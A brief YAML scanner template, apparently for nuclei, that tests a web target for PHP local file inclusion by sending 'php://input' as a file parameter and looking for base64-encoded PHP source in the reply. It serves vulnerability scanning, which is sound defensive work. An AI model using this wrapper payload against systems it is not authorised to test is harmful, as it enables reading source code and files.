id: lfi5-051
name: 'Wrapper php via file'
severity: high
type: active
tags:
  - lfi
  - traversal
  - wrapper
description: 'Reads file via php wrapper'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      file:
        - 'php://input'
    matchers:
      - type: word
        part: body
        words:
          - 'PD9waHA'
